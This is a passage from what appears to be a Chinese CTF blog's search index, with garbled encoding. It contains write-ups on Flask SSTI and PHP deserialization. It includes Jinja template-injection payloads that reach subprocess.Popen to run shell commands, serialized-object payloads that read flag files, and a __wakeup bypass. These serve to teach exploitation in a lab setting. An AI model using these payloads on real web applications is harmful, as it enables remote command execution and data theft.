print(r.text) res &#x3D; html.unescape(res[0]) print(str(i) + &quot; | &quot; + res) if &quot;subprocess.Popen&quot; in res: index &#x3D; i break except: continueprint(&quot;indexo of subprocess.Popen:&quot; + str(index)) æ‰¾åˆ°ç±»åçš„indexä¹‹åå¾ˆç®€å•äº† 12345?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; å¾—åˆ°flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"FLaskSSTI","slug":"FLaskSSTI","permalink":"https://yanmymickey.github.io/tags/FLaskSSTI/"}]},{"title":"PHPååºåˆ—åŒ–","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHPååºåˆ—åŒ–æ¼æ´/","text":"PHPååºåˆ—åŒ–é­”æœ¯æ–¹æ³•PHPé­”æœ¯æ–¹æ³• 1ã€__sleep() serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚ å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚ å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚ 2ã€__wake() unserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ __wakeup()ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚ 3ã€__construct() PHP 5 å…è¡Œå¼€å‘è€…åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ã€‚å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚ å¦‚æœå­ç±»ä¸­å®šä¹‰äº†æ„é€ å‡½æ•°åˆ™ä¸ä¼šéšå¼è°ƒç”¨å…¶çˆ¶ç±»çš„æ„é€ å‡½æ•°ã€‚è¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨ **parent::__construct()**ã€‚å¦‚æœå­ç±»æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°åˆ™ä¼šå¦‚åŒä¸€ä¸ªæ™®é€šçš„ç±»æ–¹æ³•ä¸€æ ·ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆå‡å¦‚æ²¡æœ‰è¢«å®šä¹‰ä¸º private çš„è¯ï¼‰ã€‚ 4ã€__destruct () PHP 5 å¼•å…¥äº†ææ„å‡½æ•°çš„æ¦‚å¿µï¼Œè¿™ç±»ä¼¼äºå…¶å®ƒé¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œå¦‚ C++ã€‚ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ 5ã€__toString() __toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚ éœ€è¦æŒ‡å‡ºçš„æ˜¯åœ¨ PHP 5.2.0 ä¹‹å‰ï¼Œ__toString()æ–¹æ³•åªæœ‰åœ¨ç›´æ¥ä½¿ç”¨äº echo æˆ– print æ—¶æ‰èƒ½ç”Ÿæ•ˆã€‚ PHP 5.2.0 ä¹‹åï¼Œåˆ™å¯ä»¥åœ¨ä»»ä½•å­—ç¬¦ä¸²ç¯å¢ƒç”Ÿæ•ˆï¼ˆä¾‹å¦‚é€šè¿‡ printf()ï¼Œä½¿ç”¨ %s ä¿®é¥°ç¬¦ï¼‰ï¼Œä½†ä¸èƒ½ç”¨äºéå­—ç¬¦ä¸²ç¯å¢ƒï¼ˆå¦‚ä½¿ç”¨ %d ä¿®é¥°ç¬¦ï¼‰ã€‚ è‡ª PHP 5.2.0 èµ·ï¼Œå¦‚æœå°†ä¸€ä¸ªæœªå®šä¹‰ __toString() æ–¹æ³•çš„å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¼šäº§ç”Ÿ E_RECOVERABLE_ERROR çº§åˆ«çš„é”™è¯¯ã€‚ 6ã€__invoke() å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ ç¤ºä¾‹ 1234567891011121314&lt;?phpclass CallableClass &#123; function __invoke($x) &#123; var_dump($x); &#125;&#125;$obj &#x3D; new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt;&#x2F;&#x2F;æ ·ä¾‹è¾“å‡º int(5)bool(true) 7ã€__call()å’Œ__callStatic() æ–¹æ³•é‡è½½ åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨ $nameå‚æ•°æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åç§°ã€‚$argumentså‚æ•°æ˜¯ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼ŒåŒ…å«ç€è¦ä¼ é€’ç»™æ–¹æ³• $name çš„å‚æ•°ã€‚ 8ã€__set() __get() __isset() __unset åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚ å‚æ•° $name æ˜¯æŒ‡è¦æ“ä½œçš„å˜é‡åç§°ã€‚__set() æ–¹æ³•çš„ $value å‚æ•°æŒ‡å®šäº† $nameå˜é‡çš„å€¼ã€‚ å±æ€§é‡è½½åªèƒ½åœ¨å¯¹è±¡ä¸­è¿›è¡Œã€‚åœ¨é™æ€æ–¹æ³•ä¸­ï¼Œè¿™äº›é­”æœ¯æ–¹æ³•å°†ä¸ä¼šè¢«è°ƒç”¨ã€‚æ‰€ä»¥è¿™äº›æ–¹æ³•éƒ½ä¸èƒ½è¢«å£°æ˜ä¸º staticã€‚ä» PHP 5.3.0 èµ·, å°†è¿™äº›é­”æœ¯æ–¹æ³•å®šä¹‰ä¸º static ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Šã€‚ 9ã€__set_state() è‡ª PHP 5.1.0 èµ·å½“è°ƒç”¨ var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ æœ¬æ–¹æ³•çš„å”¯ä¸€å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æŒ‰ array(â€˜propertyâ€™ =&gt; value, â€¦) æ ¼å¼æ’åˆ—çš„ç±»å±æ€§ã€‚ ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930&lt;?phpclass A&#123; public $var1; public $var2; public static function __set_state($an_array)&#123; &#x2F;&#x2F; As of PHP 5.1.0 $obj &#x3D; new A; $obj-&gt;var1 &#x3D; $an_array[&#39;var1&#39;]; $obj-&gt;var2 &#x3D; $an_array[&#39;var2&#39;]; return $obj; &#125;&#125;$a &#x3D; new A;$a-&gt;var1 &#x3D; 5;$a-&gt;var2 &#x3D; &#39;foo&#39;;eval(&#39;$b &#x3D; &#39; . var_export($a, true) . &#39;;&#39;); &#x2F;&#x2F; $b &#x3D; A::__set_state(array(&#x2F;&#x2F; &#39;var1&#39; &#x3D;&gt; 5,&#x2F;&#x2F; &#39;var2&#39; &#x3D;&gt; &#39;foo&#39;,&#x2F;&#x2F; ));var_dump($b);&#x2F;&#x2F;ä»¥ä¸Šæ ·ä¾‹ä¼šè¾“å‡ºï¼šobject(A)#2 (2) &#123; [&quot;var1&quot;]&#x3D;&gt; int(5) [&quot;var2&quot;]&#x3D;&gt; string(3) &quot;foo&quot;&#125; 10ã€__clone() å½“å¯¹è±¡è¢«å¤åˆ¶åï¼ŒPHP 5 ä¼šå¯¹å¯¹è±¡çš„æ‰€æœ‰å±æ€§æ‰§è¡Œä¸€ä¸ªæµ…å¤åˆ¶ï¼ˆshallow copyï¼‰ã€‚æ‰€æœ‰çš„å¼•ç”¨å±æ€§ ä»ç„¶ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘åŸæ¥çš„å˜é‡çš„å¼•ç”¨ã€‚ å½“å¤åˆ¶å®Œæˆæ—¶ï¼Œå¦‚æœå®šä¹‰äº† __clone() æ–¹æ³•ï¼Œåˆ™æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ï¼‰ä¸­çš„__clone()æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼ï¼ˆå¦‚æœæœ‰å¿…è¦çš„è¯ï¼‰ ç¤ºä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass SubObject&#123; static $instances &#x3D; 0; public $instance; public function __construct() &#123; $this-&gt;instance &#x3D; ++self::$instances; &#125; public function __clone() &#123; $this-&gt;instance &#x3D; ++self::$instances; &#125;&#125;class MyCloneable&#123; public $object1; public $object2; function __clone()&#123; &#x2F;&#x2F; å¼ºåˆ¶å¤åˆ¶ä¸€ä»½this-&gt;objectï¼Œ å¦åˆ™ä»ç„¶æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ $this-&gt;object1 &#x3D; clone $this-&gt;object1; &#125;&#125;$obj &#x3D; new MyCloneable();$obj-&gt;object1 &#x3D; new SubObject();$obj-&gt;object2 &#x3D; new SubObject();$obj2 &#x3D; clone $obj;print(&quot;Original Object:\\n&quot;);print_r($obj);print(&quot;Cloned Object:\\n&quot;);print_r($obj2);?&gt; 1234567891011121314151617181920212223242526272829303132&#x2F;&#x2F;ä»¥ä¸Šæ ·ä¾‹ä¼šè¾“å‡ºOriginal Object:MyCloneable Object( [object1] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 1 ) [object2] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 2 ))Cloned Object:MyCloneable Object( [object1] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 3 ) [object2] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 2 ))&#x2F;&#x2F;åŸå§‹ç±»ç»è¿‡å…‹éš†å&#x2F;&#x2F;object1å¯¹è±¡instanceå±æ€§çš„å€¼è‡ªå¢äº†1æ¬¡,è§¦å‘äº†__clone()æ–¹æ³•,è¾¾åˆ°äº†ä¿®æ”¹å±æ€§å€¼çš„ç›®çš„&#x2F;&#x2F;object2å¯¹è±¡instanceå±æ€§çš„å€¼åªæ˜¯ç®€å•å¤åˆ¶.ä»ç„¶æŒ‡å‘åŸæ¥å¯¹è±¡ å°ç»“ æ„é€ å‡½æ•° __construct å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è°ƒç”¨ ææ„å‡½æ•° __destruct å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è°ƒç”¨ æ–¹æ³•é‡è½½ __call åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ æ–¹æ³•é‡è½½ __callStatic åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ __sleep() åœ¨serialize() å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨ __wakeup() åœ¨unserialize() å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨ __toString åœ¨ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨ï¼ˆä¸ä»…ä»…æ˜¯echoçš„æ—¶å€™,æ¯”å¦‚file_exists()åˆ¤æ–­ä¹Ÿä¼šè§¦å‘ ä¾‹é¢˜æºç 1234567891011121314151617181920212223242526&#x2F;&#x2F;index.php&lt;?php require_once(&#39;shield.php&#39;); $x &#x3D; new Shield(); isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;]; if (!empty($g)) &#123; $x &#x3D; unserialize($g); &#125; echo $x-&gt;readfile();?&gt;&#x2F;&#x2F;shield.php&lt;?php &#x2F;&#x2F;flag is in flag.php class Shield &#123; public $file; function __construct($filename &#x3D; &#39;&#39;) &#123; $this -&gt; file &#x3D; $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)&#x3D;&#x3D;FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; åˆ†æä¼ å…¥ä¸€ä¸ªå‚æ•°class,classèµ‹å€¼ç»™$g,ç„¶åå¯¹gè¿›è¡Œååºåˆ—åŒ– åˆ©ç”¨çš„å¯¹è±¡æ˜¯Shield,ä¸¤ä¸ªæ–¹æ³•,__constructåœ¨å¯¹è±¡è¢«åˆ›å»ºæ—¶è°ƒç”¨,è¿™é‡Œå¹¶æ²¡æœ‰åˆ›å»ºå¯¹è±¡,è¿™é‡Œä¸éœ€è¦åˆ›å»ºå¯¹è±¡,æ‰€ä»¥ååºåˆ—åŒ–ä¸ä¼šè§¦å‘è¯¥æ–¹æ³• 123456class Shield &#123; public $file&#x3D;&quot;flag.php&quot;;&#125;$a&#x3D;new Shield();echo serialize($a);&#x2F;&#x2F;å°†è¾“å‡ºå€¼ä¼ è¿‡å»å³å¯è¯»å–flagæ–‡ä»¶å¾—åˆ°flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿/","text":"PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿è®¿é—®æ§åˆ¶ 12345678910&lt;?phpclass test&#123; private $test1&#x3D;&quot;hello&quot;; public $test2&#x3D;&quot;hello&quot;; protected $test3&#x3D;&quot;hello&quot;;&#125;$test &#x3D; new test();echo serialize($test); &#x2F;&#x2F;è¾“å‡ºåˆ°æ§åˆ¶å°æ˜¯è¿™æ ·çš„O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125; ä½†æ˜¯å…¶å®ç»“æœä¸æ˜¯è¿™æ ·çš„ 1&#123;s:11:&quot;\\00test\\00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;\\00*\\00test3&quot;;s:5:&quot;hello&quot;;&#125; ç»“æœæ˜¯è¿™æ ·çš„,åªæ˜¯å› ä¸º\\00æ˜¯ç©ºå­—ç¬¦åœ¨æ§åˆ¶å°ä¸æ˜¾ç¤º ä»”ç»†è§‚å¯Ÿ,s:åé¢çš„æ•°å­—,åå±æ€§åæ˜¯ä¸åŒ¹é…çš„,è¯´æ˜æœ‰äº›å­—ç¬¦æ²¡æœ‰æ˜¾ç¤º,å°±æ˜¯ç©ºå­—ç¬¦ å¦‚æœåœ¨urlä¼ å‚ä¸­å°±éœ€è¦å°†\\00ç¼–ç ç§°%00è¿›è¡Œä¼ å‚ æ¯”å¦‚ä¸Šè¿°ä¼ å‚å°±éœ€è¦ 1?a&#x3D;&#123;s:11:&quot;%00test%00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;%00*%00test3&quot;;s:5:&quot;hello&quot;;&#125; __wakeup()åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ,å¹¶ä¸”ä¸ä¼šæŠ¥é”™,å¯ä»¥è¢«æ­£å¸¸ååºåˆ—åŒ– 1234567891011121314151617class test &#123; public $a&#x3D;&quot;flag&#123;test&#125;&quot;; function __wakeup () &#123; &#x2F;&#x2F; TODO: Implement __wakeup() method. $this-&gt;a&#x3D;&quot;no&quot;; &#125; function __destruct () &#123; &#x2F;&#x2F; TODO: Implement __destruct() method. echo $this-&gt;a; &#125;&#125;$a&#x3D;&quot;O:4:\\&quot;test\\&quot;:1:&#123;s:1:\\&quot;a\\&quot;;s:10:\\&quot;flag&#123;test&#125;\\&quot;;&#125;&quot;;$b &#x3D; unserialize($a);&#x2F;&#x2F;è¾“å‡ºno å½“æˆ‘ä»¬æ­£å¸¸ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶,ä¼šè§¦å‘__wakeup(),åªèƒ½è¾“å‡ºno ä½†æ˜¯å½“ä¼ å…¥çš„å±æ€§å€¼å¤§äºçœŸå®çš„å±æ€§å€¼æ—¶,å°±ä¼šæ­£å¸¸è¾“å‡ºflag 1234$a&#x3D;&quot;O:4:\\&quot;test\\&quot;:1:&#123;s:1:\\&quot;a\\&quot;;s:10:\\&quot;flag&#123;test&#125;\\&quot;;&#125;&quot;;$b &#x3D; unserialize($a);&#x2F;&#x2F;è¾“å‡ºflag&#123;test&#125; æ³¨æ„ï¼šè¯¥æ¼æ´åœ¨PHP7.3.0æ˜¯ä¸èƒ½å¤ç°æˆåŠŸçš„ PHP7.3.0ç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰å‡ºç°ç±»ä¼¼PHP5.6çš„è°ƒç”¨è¿‡ç¨‹ï¼Œåªæ˜¯åšäº†ç®€å•çš„æ ‡è®°ï¼Œæ•´ä¸ªé­”æ³•å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹çš„æ—¶æœºç§»è‡³é‡Šæ”¾æ•°æ®å¤„ã€‚è¿™æ ·å°±é¿å…äº†è¿™ä¸ªç»•è¿‡çš„é—®é¢˜ ReferencePHP å†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´â€”ç»•è¿‡__wakeup()","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´/","text":"PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´Sessionååºåˆ—åŒ–æ¼æ´Sessionåºåˆ—åŒ–æœºåˆ¶Sessionæ˜¯ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å½¢å¼å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„,è¯»å–Sessionæ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹,é‚£ä¹ˆå°±æœ‰å¯èƒ½å‡ºç°ååºåˆ—åŒ–æ¼æ´ å½“session_start()è¢«è°ƒç”¨æˆ–è€…php.iniä¸­session.auto_startä¸º1æ—¶ï¼ŒPHPå†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ·sessionè¢«åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º/tmpï¼‰ PHPå¤„ç†å™¨çš„ä¸‰ç§åºåˆ—åŒ–æ–¹å¼ï¼š å¤„ç†å™¨ å­˜å‚¨æ–¹å¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ï¼‹é”®åï¼‹ç»è¿‡serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serialize serialize()å‡½æ•°ååºåˆ—å¤„ç†æ•°ç»„æ–¹å¼ php.iniä¸­å«æœ‰å‡ ä¸ªä¸sessionå­˜å‚¨é…ç½®ç›¸å…³çš„é…ç½®é¡¹ï¼š 123session.save_path&#x3D;&quot;&quot; --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„,é»˜è®¤åœ¨&#x2F;tmpsession.auto_start --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨session.serialize_handler --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php ç®€è¦åˆ†æå½“ç”±äºå¤„ç†sessionçš„å¤„ç†å™¨ä¸åŒæ—¶å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–æ¼æ´ å¤„ç†å™¨æ˜¯phpæ—¶,æ˜¯ä»¥|åä¸ºååºåˆ—åŒ–å†…å®¹çš„,è€Œç”¨php_serializeå­˜å‚¨çš„sessionå¦‚æœæ²¡æœ‰è¿‡æ»¤|å­—ç¬¦å°±ä¼šå¯¼è‡´phpå¤„ç†å™¨å°†åé¢çš„å†…å®¹ååºåˆ—åŒ–,è¾¾åˆ°ååºåˆ—åŒ–æˆå¯¹è±¡çš„ç›®çš„ pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–phar://åè®®å¯ä»¥å°†å¤šä¸ªæ–‡ä»¶å½’å…¥ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶ pharæ–‡ä»¶PHARï¼ˆPHPå½’æ¡£ï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œæ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ã€‚æ‰€æœ‰PHARæ–‡ä»¶éƒ½ä½¿ç”¨.pharä½œä¸ºæ–‡ä»¶æ‰©å±•åï¼ŒPHARæ ¼å¼çš„å½’æ¡£éœ€è¦ä½¿ç”¨è‡ªå·±å†™çš„PHPä»£ç ã€‚ å®‰è£…pharæ‰©å±•ç„¶ååœ¨php.iniä¸­è®¾ç½®phar.readonly=offæˆ–0æ‰å¯ä»¥ä½¿ç”¨pharå¯¹è±¡åˆ›å»ºpharæ–‡ä»¶ pharæ–‡ä»¶ç»“æ„Pharå®˜æ–¹æ–‡æ¡£ 1ã€a stubè¯†åˆ«pharæ‹“å±•çš„æ ‡è¯†ï¼Œæ ¼å¼:xxxã€‚å¯¹åº”çš„å‡½æ•°Phar::setStub 2ã€a manifest describing the contentsè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å¯¹åº”å‡½æ•°Phar::setMetadataâ€”è®¾ç½®pharå½’æ¡£å…ƒæ•°æ® 3ã€ the file contentsè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 4ã€[optional] a signature for verifying Phar integrity (phar file format only)ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ã€‚å¯¹åº”å‡½æ•°Phar :: stopBuffering â€”åœæ­¢ç¼“å†²å¯¹Pharå­˜æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜ Pharå†…ç½®æ–¹æ³•12345$phar &#x3D; new Phar(&#39;phar&#x2F;hpdoger.phar&#39;); &#x2F;&#x2F;å®ä¾‹ä¸€ä¸ªpharå¯¹è±¡ä¾›åç»­æ“ä½œ$phar-&gt;startBuffering() &#x2F;&#x2F;å¼€å§‹ç¼“å†²Pharå†™æ“ä½œ$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo &#39;this is test file&#39;;&#39;); &#x2F;&#x2F;ä»¥å­—ç¬¦ä¸²çš„å½¢å¼æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åˆ° phar æ¡£æ¡ˆ$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) &#x2F;&#x2F;æŠŠä¸€ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å½’æ¡£åˆ°pharæ¡£æ¡ˆ$phar-&gt;extractTo() &#x2F;&#x2F;è§£å‹ä¸€ä¸ªpharåŒ…çš„å‡½æ•°ï¼ŒextractTo 